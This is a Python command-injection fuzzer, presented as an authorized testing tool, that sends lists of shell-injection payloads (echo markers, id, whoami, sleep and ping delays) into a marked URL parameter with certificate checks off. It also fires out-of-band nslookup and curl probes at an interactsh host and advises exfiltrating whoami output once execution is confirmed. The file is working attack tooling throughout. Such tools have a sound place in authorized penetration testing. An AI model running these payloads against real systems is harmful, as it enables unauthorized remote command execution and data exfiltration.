#!/usr/bin/env python3
"""
cmdi_fuzz.py — authorized command-injection prober. Tests a single injection point (mark it FUZZ or it
appends to the param) for IN-BAND (marker echoed), TIME-BASED (consistent delay), and OOB (you watch
your interactsh) command execution.

A hit is a finding ONLY once you confirm execution and prove impact safely (COMMAND_INJECTION_TESTING_GUIDE.md §15/§19).

Usage:
  python3 cmdi_fuzz.py -u "https://target/ping?host=FUZZ"
  python3 cmdi_fuzz.py -u "https://target/ping?host=FUZZ" --oob YOURID.oast.pro
"""
import argparse, statistics, sys, time, urllib.parse as up
try:
    import requests
    requests.packages.urllib3.disable_warnings()  # noqa
except ImportError:
    sys.exit("pip install requests")

UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124 Safari/537.36"
MARK = "CMDI7F3A9"

INBAND = [
    # Linux / sh — separators + quote-breakout contexts (§5/§6.1)
    f";echo {MARK}", f"|echo {MARK}", f"||echo {MARK}", f"&&echo {MARK}",
    f"`echo {MARK}`", f"$(echo {MARK})", f"%0aecho {MARK}",
    f";echo {MARK}#", f"'\necho {MARK}\n'", f"\"&&echo {MARK}&&\"",
    f'";echo {MARK};"', f"';echo {MARK};'", f") ;echo {MARK}; echo $(",   # double / single / inside-$()
    ";id", "|id", "`id`", "$(id)",
    # Windows — cmd.exe separators + ^/"" splitting (§14.1); Linux payloads silent ≠ safe
    f"&echo {MARK}", f"|echo {MARK}", f"&&echo {MARK}", f"& echo {MARK}",
    "&whoami", "|whoami", "&ver", "&echo %OS%", f"&e^cho {MARK}",
]
TIME = [";sleep 8", "|sleep 8", "||sleep 8", "`sleep 8`", "$(sleep 8)", "&&sleep 8",
        ";ping -c 8 127.0.0.1",
        # Windows time-based:
        "&ping -n 8 127.0.0.1", "|ping -n 8 127.0.0.1", "&timeout 8", "&& timeout /t 8"]

def inject(url, p):
    if "FUZZ" in url:
        return url.replace("FUZZ", up.quote(p, safe=""))
    sep = "&" if "?" in url else "?"
    return url + sep + "x=" + up.quote(p)

def timed_get(url, timeout):
    t = time.time()
    try:
        r = requests.get(url, headers={"User-Agent": UA}, timeout=timeout, verify=False)
        return time.time() - t, r
    except requests.exceptions.ReadTimeout:
        return timeout, None
    except Exception:
        return None, None

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-u", "--url", required=True, help="mark injection point with FUZZ")
    ap.add_argument("--oob", help="your interactsh host, e.g. abcd.oast.pro (watch it for hits)")
    ap.add_argument("--timeout", type=float, default=20)
    a = ap.parse_args()

    # baseline timing
    base = []
    for _ in range(3):
        dt, _ = timed_get(inject(a.url, "127.0.0.1"), a.timeout)
        if dt is not None:
            base.append(dt)
    b = statistics.median(base) if base else 0.3
    print(f"[*] baseline ~{b:.2f}s")

    print("\n[*] IN-BAND probes:")
    found_inband = False
    for p in INBAND:
        _, r = timed_get(inject(a.url, p), a.timeout)
        if r is not None and (MARK in r.text or "uid=" in r.text):
            print(f"   [RCE in-band]  payload={p!r}\n      -> response contains marker/uid. CRITICAL. (§11)")
            found_inband = True
    if not found_inband:
        print("   (no in-band marker)")

    print("\n[*] TIME-BASED probes (need consistent delay):")
    for p in TIME:
        deltas = []
        for _ in range(2):
            dt, _ = timed_get(inject(a.url, p), a.timeout)
            if dt is not None:
                deltas.append(dt)
        if deltas and min(deltas) > b + 6:
            print(f"   [RCE blind/time]  payload={p!r}  delays={['%.1f'%d for d in deltas]} (baseline {b:.1f}s)")
            print(f"      -> consistent ~8s delay = execution. CRITICAL. Strengthen with OOB/exfil (§8/§12).")

    if a.oob:
        print(f"\n[*] OOB probes (WATCH {a.oob} for DNS/HTTP hits from the SERVER IP):")
        for p in [f";nslookup {MARK}.{a.oob}", f"|nslookup {MARK}.{a.oob}",
                  f"`nslookup {MARK}.{a.oob}`", f"$(nslookup {MARK}.{a.oob})",
                  f";curl http://{a.oob}/{MARK}", f"&nslookup {MARK}.{a.oob}"]:
            timed_get(inject(a.url, p), a.timeout)
            print(f"   sent: {p}")
        print(f"   -> a hit for {MARK}.{a.oob} from the target IP CONFIRMS blind RCE. Then exfil $(whoami) (§12).")

    print("\n[!] Reproduce any hit by hand with a benign marker (id / whoami / OOB $(whoami)); "
          "exclude jitter; clean up; report as RCE (§19).")

if __name__ == "__main__":
    main()
